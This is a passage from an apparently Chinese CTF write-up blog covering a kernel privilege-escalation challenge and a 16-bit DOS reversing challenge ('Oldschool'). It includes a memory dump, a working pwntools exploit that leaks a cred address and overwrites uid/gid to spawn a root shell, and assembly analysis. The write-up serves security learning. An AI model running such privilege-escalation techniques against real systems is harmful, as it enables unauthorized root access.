0x6161616161616161</span><br><span class="line">0xffff8880077b2490:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffff8880077b24a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffff8880077b24b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffff8880077b24c0:	0x6161616161616161	0x00007fffffffefae</span><br><span class="line">0xffff8880077b24d0:	0x0000000100000001	0x0000000000000000</span><br><span class="line">0xffff8880077b24e0:	0xffff88800756c3c0	0x0000000000000000</span><br><span class="line">pwndbg&gt; x&#x2F;20xg 0xffff88800756c3c0</span><br><span class="line">0xffff88800756c3c0:	0x0000000000000000	0xffff88800770f440</span><br><span class="line">0xffff88800756c3d0:	0x0000003fffffffff	0x0000000000000000</span><br><span class="line">0xffff88800756c3e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88800756c3f0:	0xffffffff00000000	0x000000000000003f</span><br><span class="line">0xffff88800756c400:	0x0000003fffffffff	0x0000000000000000</span><br><span class="line">0xffff88800756c410:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88800756c420:	0x0000000000000000	0xffffffff81c38280</span><br><span class="line">0xffff88800756c430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xffff88800756c440:	0x0000000000000001	0x0000000000000000</span><br><span class="line">0xffff88800756c450:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p><strong>可以看到偏移0xe0位置为0xffff88800756c3c0<br>而0xffff88800756c3c0下对应uid和gid位置都为0(debug时是root身份)<br>同而注意到程序会打印vmmap和clear_user的参数<br>因此可以将map_info_offset指向这里来vmmap(偏移位置为0xe0，即距离文件头偏移：0xe0-0x48=0x98位置，但是load_addr有位运算操作再传参并输出，因此这里选择设置map_info_offset为0x90,使length为cred_addr并leak)，此时即会打印出cred的地址，虽然最后会crash，不过能leak一次cred地址<br>这里注意，开启内核地址随机化时cred地址线程间并不相同<br>但是真实环境下可以观察到cred地址会是一组地址的循环,因此可以预估下次程序启动时cred地址从而覆盖掉uid和gid完成提权<br>leak:</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"P4"</span>             </span><br><span class="line">payload += p8(<span class="number">0</span>)<span class="comment"># version</span></span><br><span class="line">payload += p8(<span class="number">1</span>)<span class="comment"># type</span></span><br><span class="line">payload += p32(<span class="number">1</span>)<span class="comment"># map_count</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>)<span class="comment">#map_info_offset</span></span><br><span class="line">payload += p64(<span class="number">0</span>)     <span class="comment"># entry</span></span><br><span class="line">payload += <span class="string">"kirin"</span></span><br><span class="line"><span class="keyword">print</span> payload.encode(<span class="string">"base64"</span>)</span><br><span class="line"><span class="comment">#output=UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAa2lyaW4=</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAa2lyaW4&#x3D;&quot; | base64 -d &gt; &#x2F;tmp&#x2F;kirin</span><br><span class="line">chmod +x  &#x2F;tmp&#x2F;kirin</span><br><span class="line">&#x2F;tmp&#x2F;kirin</span><br></pre></td></tr></table></figure>
<p>可以看到cred地址规律：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp $ .&#x2F;kirin</span><br><span class="line">[  310.536033] vm_mmap(load_addr&#x3D;0x0, length&#x3D;0xffff90e845d72300, offset&#x3D;0x0, prot&#x3D;0)</span><br><span class="line">[  310.538726] kirin[559]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14</span><br><span class="line">[  310.543394] Code: Bad RIP value.</span><br><span class="line">Segmentation fault</span><br><span class="line">&#x2F;tmp $ .&#x2F;kirin</span><br><span class="line">[  311.480867] vm_mmap(load_addr&#x3D;0x0, length&#x3D;0xffff90e845d729c0, offset&#x3D;0x0, prot&#x3D;0)</span><br><span class="line">[  311.483814] kirin[560]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14</span><br><span class="line">[  311.486224] Code: Bad RIP value.</span><br><span class="line">Segmentation fault</span><br><span class="line">&#x2F;tmp $ .&#x2F;kirin</span><br><span class="line">[  312.793369] vm_mmap(load_addr&#x3D;0x0, length&#x3D;0xffff90e845d72cc0, offset&#x3D;0x0, prot&#x3D;0)</span><br><span class="line">[  312.797228] kirin[561]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14</span><br><span class="line">[  312.804765] Code: Bad RIP value.</span><br><span class="line">Segmentation fault</span><br><span class="line">&#x2F;tmp $ .&#x2F;kirin</span><br><span class="line">[  314.042323] vm_mmap(load_addr&#x3D;0x0, length&#x3D;0xffff90e845d72b40, offset&#x3D;0x0, prot&#x3D;0)</span><br><span class="line">[  314.045054] kirin[562]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14</span><br><span class="line">[  314.047779] Code: Bad RIP value.</span><br><span class="line">Segmentation fault</span><br><span class="line">&#x2F;tmp $ .&#x2F;kirin</span><br><span class="line">[  315.349773] vm_mmap(load_addr&#x3D;0x0, length&#x3D;0xffff90e845d72840, offset&#x3D;0x0, prot&#x3D;0)</span><br><span class="line">[  315.352563] kirin[563]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14</span><br><span class="line">[  315.357168] Code: Bad RIP value.</span><br><span class="line">Segmentation fault</span><br><span class="line">&#x2F;tmp $ .&#x2F;kirin</span><br><span class="line">[  316.229283] vm_mmap(load_addr&#x3D;0x0, length&#x3D;0xffff90e845d72300, offset&#x3D;0x0, prot&#x3D;0)</span><br><span class="line">[  316.232561] kirin[564]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14</span><br><span class="line">[  316.234984] Code: Bad RIP value.</span><br><span class="line">Segmentation fault</span><br><span class="line">&#x2F;tmp $ .&#x2F;kirin</span><br><span class="line">[  316.954076] vm_mmap(load_addr&#x3D;0x0, length&#x3D;0xffff90e845d729c0, offset&#x3D;0x0, prot&#x3D;0)</span><br><span class="line">[  316.957635] kirin[565]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14</span><br><span class="line">[  316.960276] Code: Bad RIP value.</span><br><span class="line">Segmentation fault</span><br><span class="line">&#x2F;tmp $ .&#x2F;kirin</span><br><span class="line">[  317.663571] vm_mmap(load_addr&#x3D;0x0, length&#x3D;0xffff90e845d72cc0, offset&#x3D;0x0, prot&#x3D;0)</span><br><span class="line">[  317.667293] kirin[566]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14</span><br><span class="line">[  317.669847] Code: Bad RIP value.</span><br><span class="line">Segmentation fault</span><br><span class="line">&#x2F;tmp $ .&#x2F;kirin</span><br><span class="line">[  318.516134] vm_mmap(load_addr&#x3D;0x0, length&#x3D;0xffff90e845d72b40, offset&#x3D;0x0, prot&#x3D;0)</span><br><span class="line">[  318.518924] kirin[567]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14</span><br><span class="line">[  318.522188] Code: Bad RIP value.</span><br><span class="line">Segmentation fault</span><br><span class="line">&#x2F;tmp $ .&#x2F;kirin</span><br><span class="line">[  319.341463] vm_mmap(load_addr&#x3D;0x0, length&#x3D;0xffff90e845d72840, offset&#x3D;0x0, prot&#x3D;0)</span><br><span class="line">[  319.343774] kirin[568]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14</span><br><span class="line">[  319.346129] Code: Bad RIP value.</span><br><span class="line">Segmentation fault</span><br><span class="line">&#x2F;tmp $</span><br></pre></td></tr></table></figure>
<p>可以看到每五个一个循环(至少在短时间内是这样)<br>所以我们完全可以leak出一次循环后猜测下次cred位置，而后提权到root拿到flag<br><strong>但是我在编写exp时遇到了问题<br>最初想法是leak出五个地址，而后利用循环预测<br>但是其实一段时间之后，这五个地址会变化，不过也会循环，这样虽然可以把所有可能情况列举生成exp，然后再预测，不过有点太麻烦<br>所以最终选择leak处一个地址后直接循环此exp，减小中间的时间(我并不确定内核的这种地址循环是时间还是轮数问题)，很大地提高了命中率(约为100%)</strong></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload=<span class="string">"P4"</span></span><br><span class="line">    payload+=p8(<span class="number">0</span>)<span class="comment">#version</span></span><br><span class="line">    payload+=p8(<span class="number">1</span>)<span class="comment">#type</span></span><br><span class="line">    payload+=p32(<span class="number">2</span>)<span class="comment">#map_info_num</span></span><br><span class="line">    payload+=p64(<span class="number">0x18</span>)<span class="comment">#map_info_offset</span></span><br><span class="line">    payload+=p64(<span class="number">0x400048</span>)<span class="comment">#entry</span></span><br><span class="line">    payload+=p64(<span class="number">0x400000</span>|<span class="number">7</span>)<span class="comment">#port=7-&gt;rwx</span></span><br><span class="line">    payload+=p64(<span class="number">0x1000</span>)<span class="comment">#length</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#offset</span></span><br><span class="line">    payload+=p64((addr|<span class="number">8</span>)+<span class="number">0x10</span>)<span class="comment">#cred</span></span><br><span class="line">    payload+=p64(<span class="number">0x48</span>)<span class="comment">#overwrite_length</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)</span><br><span class="line">    payload+=asm(shellcraft.amd64.sh(),arch=<span class="string">"amd64"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload.encode(<span class="string">"base64"</span>).strip()</span><br><span class="line">p=process(<span class="string">"./run.sh"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"/ $ "</span>,<span class="string">'echo -n "UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAa2lyaW4=" | base64 -d &gt; /tmp/kirin; chmod +x /tmp/kirin'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"/ $ "</span>,<span class="string">"/tmp/kirin"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"length="</span>)</span><br><span class="line">addr=int(p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line">exp=get_payload(addr)</span><br><span class="line">cmd=<span class="string">'echo -n "%s" | base64 -d &gt; /tmp/exp; chmod +x /tmp/exp'</span> %exp</span><br><span class="line">p.sendlineafter(<span class="string">"/ $ "</span>,cmd)</span><br><span class="line">p.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    p.sendline(<span class="string">"/tmp/exp"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"/ "</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    ans=p.recv(<span class="number">2</span>)  </span><br><span class="line">    <span class="keyword">print</span> ans[<span class="number">0</span>] </span><br><span class="line">    <span class="keyword">if</span> ans[<span class="number">0</span>]==<span class="string">'#'</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Get Shell Successfully"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">9</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Failed this time,please try again!"</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Oldschool"><a href="#Oldschool" class="headerlink" title="Oldschool"></a>Oldschool</h2><p>比较简单的一道题目，16位程序逆向,IDA不支持F5，不过guidra支持反汇编为伪代码，但是看起来不太习惯，还是汇编舒服<br>首先看到程序整体流程:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">seg001:0000                 public start</span><br><span class="line">seg001:0000 start           proc near</span><br><span class="line">seg001:0000                 mov     ax, seg seg002</span><br><span class="line">seg001:0003                 mov     ss, ax</span><br><span class="line">seg001:0005                 mov     ax, 190h</span><br><span class="line">seg001:0008                 mov     sp, ax</span><br><span class="line">seg001:000A                 mov     ax, seg seg000</span><br><span class="line">seg001:000D                 mov     ds, ax</span><br><span class="line">seg001:000F                 assume ds:seg000</span><br><span class="line">seg001:000F                 mov     si, 0</span><br><span class="line">seg001:0012                 mov     ah, 9</span><br><span class="line">seg001:0014                 mov     dx, 0A2h</span><br><span class="line">seg001:0017                 int     21h             ; DOS - PRINT STRING</span><br><span class="line">seg001:0017                                         ; DS:DX -&gt; string terminated by &quot;$&quot;</span><br><span class="line">seg001:0019                 call    sub_10148</span><br><span class="line">seg001:001C                 mov     di, si</span><br><span class="line">seg001:001E                 call    sub_10215</span><br><span class="line">seg001:0021                 mov     al, 45h ; &#39;E&#39;</span><br><span class="line">seg001:0023                 mov     [di], al</span><br><span class="line">seg001:0025                 mov     si, 0</span><br><span class="line">seg001:0028                 mov     al, 53h ; &#39;S&#39;</span><br><span class="line">seg001:002A                 mov     [si+50h], al</span><br><span class="line">seg001:002D                 call    sub_10124</span><br><span class="line">seg001:0030</span><br><span class="line">seg001:0030 loc_10120:                              ; CODE XREF: sub_10148+73↓j</span><br><span class="line">seg001:0030                 mov     ah, 4Ch</span><br><span class="line">seg001:0032                 int     21h             ; DOS - 2+ - QUIT WITH EXIT CODE (EXIT)</span><br><span class="line">seg001:0032 start           endp</span><br></pre></td></tr></table></figure>
<p>首先输出A2偏移处的字符串(以”$”结尾)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">seg001:0012                 mov     ah, 9</span><br><span class="line">seg001:0014                 mov     dx, 0A2h</span><br><span class="line">seg001:0017                 int     21h</span><br><span class="line">#Give me a flag to draw!\n$</span><br></pre></td></tr></table></figure>
<p>而后调用了三个函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">seg001:0019                 call    sub_10148</span><br><span class="line">seg001:001C                 mov     di, si</span><br><span class="line">seg001:001E                 call    sub_10215</span><br><span class="line">seg001:0021                 mov     al, 45h ; &#39;E&#39;</span><br><span class="line">seg001:0023                 mov     [di], al</span><br><span class="line">seg001:0025                 mov     si, 0</span><br><span class="line">seg001:0028                 mov     al, 53h ; &#39;S&#39;</span><br><span class="line">seg001:002A                 mov     [si+50h], al</span><br><span class="line">seg001:002D                 call    sub_10124</span><br></pre></td></tr></table></figure>
<p>首先看后面短的两个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">seg001:0034 sub_10124       proc near               ; CODE XREF: start+2D↑p</span><br><span class="line">seg001:0034                 mov     dl, 0Ah</span><br><span class="line">seg001:0036                 mov     ah, 2</span><br><span class="line">seg001:0038                 int     21h             ; DOS - DISPLAY OUTPUT</span><br><span class="line">seg001:0038                                         ; DL &#x3D; character to send to standard output</span><br><span class="line">seg001:003A                 mov     cx, 8</span><br><span class="line">seg001:003D                 mov     dx, si</span><br><span class="line">seg001:003F</span><br><span class="line">seg001:003F loc_1012F:                              ; CODE XREF: sub_10124+13↓j</span><br><span class="line">seg001:003F                 add     si, 11h</span><br><span class="line">seg001:0042                 mov     al, 0Ah</span><br><span class="line">seg001:0044                 mov     [si], al</span><br><span class="line">seg001:0046                 inc     si</span><br><span class="line">seg001:0047                 loop    loc_1012F</span><br><span class="line">seg001:0049                 add     si, 11h</span><br><span class="line">seg001:004C                 mov     al, 24h ; &#39;$&#39;</span><br><span class="line">seg001:004E                 mov     [si], al</span><br><span class="line">seg001:0050                 mov     ah, 9</span><br><span class="line">seg001:0052                 int     21h             ; DOS - PRINT STRING</span><br><span class="line">seg001:0052                                         ; DS:DX -&gt; string terminated by &quot;$&quot;</span><br><span class="line">seg001:0054                 mov     si, 0</span><br><span class="line">seg001:0057                 retn</span><br><span class="line">seg001:0057 sub_10124       endp</span><br></pre></td></tr></table></figure>
<p>很显然循环8次，从0开始（从start中看出此函数si起始值为0）每0x12字节写入一个换行符，最后一次写入”$”结束符，而后从dx(=0)位置输出字符串，其实就是对应题目给的flag.txt:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  4 &#123;4pp   </span><br><span class="line"> p &#123;k4&#123; E  </span><br><span class="line">p 44p&#123; p   </span><br><span class="line"> 4 p       </span><br><span class="line">  S</span><br></pre></td></tr></table></figure>
<p>所以我们最后需要输出和flag.txt一致即可<br>再看函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">seg001:0125 sub_10215       proc near               ; CODE XREF: start+1E↑p</span><br><span class="line">seg001:0125                 mov     si, 0</span><br><span class="line">seg001:0128                 mov     cx, 0A1h</span><br><span class="line">seg001:012B</span><br><span class="line">seg001:012B loc_1021B:                              ; CODE XREF: sub_10215+1A↓j</span><br><span class="line">seg001:012B                 mov     al, [si]</span><br><span class="line">seg001:012D                 cmp     al, 0Dh</span><br><span class="line">seg001:012F                 ja      short loc_10232</span><br><span class="line">seg001:0131                 push    si</span><br><span class="line">seg001:0132                 mov     si, 0BCh</span><br><span class="line">seg001:0135                 xor     ah, ah</span><br><span class="line">seg001:0137                 add     si, ax</span><br><span class="line">seg001:0139                 mov     bl, [si]</span><br><span class="line">seg001:013B                 pop     si</span><br><span class="line">seg001:013C</span><br><span class="line">seg001:013C loc_1022C:                              ; CODE XREF: sub_10215+1F↓j</span><br><span class="line">seg001:013C                 mov     [si], bl</span><br><span class="line">seg001:013E                 inc     si</span><br><span class="line">seg001:013F                 loop    loc_1021B</span><br><span class="line">seg001:0141                 retn</span><br><span class="line">seg001:0142 ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:0142</span><br><span class="line">seg001:0142 loc_10232:                              ; CODE XREF: sub_10215+A↑j</span><br><span class="line">seg001:0142                 mov     bl, 5Eh ; &#39;^&#39;</span><br><span class="line">seg001:0144                 jmp     short loc_1022C</span><br><span class="line">seg001:0144 sub_10215       endp</span><br></pre></td></tr></table></figure>
<p>作用很明显，从0到0xA1位置，值大于0xD则替换为”^”,否则根据值对应0xBC偏移位置的字符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p4&#123;krule_ctf&#125;#注意最开始有空格</span><br></pre></td></tr></table></figure>
<p>然后最开始调用的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">seg001:0058 ; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; S U B R O U T I N E &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">seg001:0058</span><br><span class="line">seg001:0058</span><br><span class="line">seg001:0058 sub_10148       proc near               ; CODE XREF: start+19↑p</span><br><span class="line">seg001:0058                 mov     si, 0</span><br><span class="line">seg001:005B                 add     si, 50h ; &#39;P&#39;</span><br><span class="line">seg001:005E                 mov     cx, 9</span><br><span class="line">seg001:0061</span><br><span class="line">seg001:0061 loc_10151:                              ; CODE XREF: sub_10148+4D↓j</span><br><span class="line">seg001:0061                 push    cx</span><br><span class="line">seg001:0062                 mov     cx, 2</span><br><span class="line">seg001:0065                 xor     dl, dl</span><br><span class="line">seg001:0067                 mov     bl, 10h</span><br><span class="line">seg001:0069</span><br><span class="line">seg001:0069 loc_10159:                              ; CODE XREF: sub_10148+29↓j</span><br><span class="line">seg001:0069                 mov     ah, 1</span><br><span class="line">seg001:006B                 int     21h             ; DOS - KEYBOARD INPUT</span><br><span class="line">seg001:006B                                         ; Return: AL &#x3D; character read</span><br><span class="line">seg001:006D                 cmp     al, 3Ah ; &#39;:&#39;</span><br><span class="line">seg001:006F                 jb      short loc_10198</span><br><span class="line">seg001:0071                 cmp     al, 47h ; &#39;G&#39;</span><br><span class="line">seg001:0073                 jb      short loc_101AA</span><br><span class="line">seg001:0075                 cmp     al, 67h ; &#39;g&#39;</span><br><span class="line">seg001:0077                 jb      short loc_101A0</span><br><span class="line">seg001:0079                 jmp     short loc_101B4</span><br><span class="line">seg001:007B ; ---------------------------------------------------------------------------</span><br><span class="line">seg001:007B</span><br><span class="line">seg001:007B loc_1016B:                              ; CODE XREF: sub_10148+56↓j</span><br><span class="line">seg001:007B                                         ; sub_10148+60↓j ...</span><br><span class="line">seg001:007B                 mul     bl</span><br><span class="line">seg001:007D                 add     dl, al</span><br><span class="line">seg001:007F                 mov     bl, 1</span><br><span class="line">seg001:0081                 loop    loc_10159</span><br><span class="line">seg001:0083                 mov     cx, 4</span><br><span class="line">seg001:0086</span><br><span class="line">seg001:0086 loc_10176:                              ; CODE XREF: sub_10148+4A↓j</span><br><span class="line">seg001:0086                 mov     al, dl</span><br><span class="line">seg001:0088                 and     al, 1</span><br><span class="line">seg001:008A                 jz      short loc_101DF</span><br><span class="line">seg001:008C                 jmp     short loc_101F8</span><br><span class="line">seg001:008E ; 